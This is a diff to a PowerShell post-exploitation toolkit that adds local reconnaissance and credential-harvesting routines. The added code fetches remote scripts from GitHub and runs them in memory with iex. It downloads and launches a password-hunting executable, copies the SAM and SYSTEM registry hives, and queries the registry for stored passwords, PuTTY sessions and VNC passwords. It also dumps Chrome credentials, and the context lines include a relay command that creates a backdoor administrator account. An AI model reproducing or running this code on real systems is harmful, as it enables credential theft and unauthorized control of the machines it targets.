@@ -162,7 +162,7 @@ function Inveigh {
 
         Invoke-InveighRelay -ConsoleOutput Y -StatusOutput N -Target $target -Command "net user pwned 0WnedAccount! /add; net localgroup $admingroup pwned /add" -Attack Enumerate,Execute,Session
 
-        Write-Host "You can now check your sessions with ´Get-Inveigh -Session´ and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation"
+        Write-Host "You can now check your sessions with Â´Get-Inveigh -SessionÂ´ and use Invoke-SMBClient, Invoke-SMBEnum and Invoke-SMBExec for further recon/exploitation"
     }
 }
 
@@ -288,13 +288,101 @@ function localreconmodules
 
             Write-Host -ForegroundColor Yellow 'Starting local Recon phase:'
 
-	    $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
+            #Check for WSUS Updates over HTTP
+	        $UseWUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU" -Name UseWUServer -ErrorAction SilentlyContinue).UseWUServer
             $WUServer = (Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate" -Name WUServer -ErrorAction SilentlyContinue).WUServer
 
             if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
-	    {
-        	Write-Host -ForegroundColor Yellow "WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!"
-		echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> $currentPath\LocalRecon\WsusoverHTTP.txt
+	        {
+        	    Write-Host -ForegroundColor Yellow "WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!"
+		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
+            }
+
+            #Check for SMB Signing
+            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Invoke-SMBNegotiate.ps1')
+            Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\LocalRecon\SMBSigningState.txt"
+
+            #Collecting Informations
+            systeminfo >> "$currentPath\LocalRecon\systeminfo.txt"
+            wmic qfe >> "$currentPath\LocalRecon\Patches.txt"
+            wmic os get osarchitecture >> "$currentPath\LocalRecon\Architecture.txt"
+            Get-ChildItem Env: | ft Key,Value >> "$currentPath\LocalRecon\Environmentvariables.txt"
+            Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root >> "$currentPath\LocalRecon\Drives.txt"
+            whoami /priv >> "$currentPath\LocalRecon\Privileges.txt"
+            Get-LocalUser | ft Name,Enabled,LastLogon >> "$currentPath\LocalRecon\LocalUsers.txt"
+            net accounts >>  "$currentPath\LocalRecon\PasswordPolicy.txt"
+            Get-LocalGroup | ft Name >> "$currentPath\LocalRecon\LocalGroups.txt"
+            Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address >> "$currentPath\LocalRecon\Networkinterfaces.txt"
+            Get-DnsClientServerAddress -AddressFamily IPv4 | ft >> "$currentPath\LocalRecon\DNSServers.txt"
+            Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex >> "$currentPath\LocalRecon\NetRoutes.txt"
+            Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State >> "$currentPath\LocalRecon\ArpTable.txt"
+            netstat -ano >> "$currentPath\LocalRecon\ActiveConnections.txt"
+            net share >> "$currentPath\LocalRecon\Networkshares.txt"
+            
+            
+            $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
+            if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
+            {
+                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+                Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
+                invoke-expression "cmd /c start powershell -Command {.\passhunt.exe -o $currentPath}"
+                $sharepasshunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
+                if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
+                {
+                    get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
+                    $shares = get-content .\passhuntshares.txt | select-object -skip 4
+                    foreach ($line in $shares)
+                    {
+                       invoke-expression "cmd /c start powershell -Command {.\passhunt.exe -s $line -o $currentPath}" 
+                    }
+                    
+                }
+            }
+            
+            # Collecting more information
+            $snmp = Test-Path -Path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP
+            If ($snmp -eq "True")
+            {
+                Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse >> "$currentPath\LocalRecon\SNMP.txt"
+            }
+            
+            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM";}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM";}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\LocalRecon\SAM";}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM";}
+            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\LocalRecon\SYS";}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\LocalRecon\SYS";}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\LocalRecon\SYS";}
+
+            REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
+            REG QUERY HKCU /F "password" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKCURegistryPasswords.txt"
+
+            If (Test-Path -Path HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon){reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"}
+            If (Test-Path -Path HKLM\SYSTEM\Current\ControlSet\Services\SNMP){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
+            If (Test-Path -Path HKCU\Software\SimonTatham\PuTTY\Sessions){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\LocalRecon\PuttySessions.txt"}
+            If (Test-Path -Path HKCU\Software\ORL\WinVNC3\Password){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
+            If (Test-Path -Path HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\LocalRecon\RealVNCPassword.txt"}
+
+            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
+            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
+            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow "Unattended.xml Found, check it for passwords"}
+            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow "Sysprep.inf Found, check it for passwords"}
+            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow "Sysprep.inf Found, check it for passwords"}
+
+            Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\LocalRecon\webconfigfiles.txt"
+
+            Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"
+
+            cmdkey /list >> "$currentPath\LocalRecon\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+
+
+
+            $dotnet = Read-Host -Prompt 'Do you want to search for .NET Binaries on this system? (theese can be easily reverse engineered for vulnerability analysis) (yes/no)'
+            if ($dotnet -eq "yes" -or $dotnet -eq "y" -or $dotnet -eq "Yes" -or $dotnet -eq "Y")
+            {
+                Write-Host -ForegroundColor Yellow 'Searching for Files - Output is saved to the localrecon folder:'
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Get-DotNetServices.ps1')
+                Get-DotNetServices  >> $currentPath\LocalRecon\DotNetBinaries.txt
             }
 
             if (isadmin)
@@ -332,6 +420,15 @@ function localreconmodules
             {
                 jaws
             }
+            
+            $chrome = Read-Host -Prompt 'Dump Chrome Browser history and maybe passwords? (yes/no)'
+            if ($chrome -eq "yes" -or $chrome -eq "y" -or $chrome -eq "Yes" -or $chrome -eq "Y")
+            {
+                iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/leechristensen/Random/master/PowerShellScripts/Get-ChromeDump.ps1')
+                Get-ChromeDump >> "$currentPath\LocalRecon\Chromecredentials.txt"
+                Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
+                Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
+            }                
 }
 
 function jaws
@@ -376,7 +473,7 @@ function domainreconmodules
             Get-ExploitableSystem >> $currentPath\DomainRecon\ExploitableSystems.txt
 
             ## TODO Invoke-WebRequest -Uri 'https://github.com/NetSPI/goddi/releases/download/v1.1/goddi-windows-amd64.exe' -Outfile $currentPath\Recon.exe
-
+            ## TODO https://github.com/canix1/ADACLScanner 
 
             #Powerview
             Write-Host -ForegroundColor Yellow 'All those PowerView Network Skripts for later Lookup getting executed and saved:'
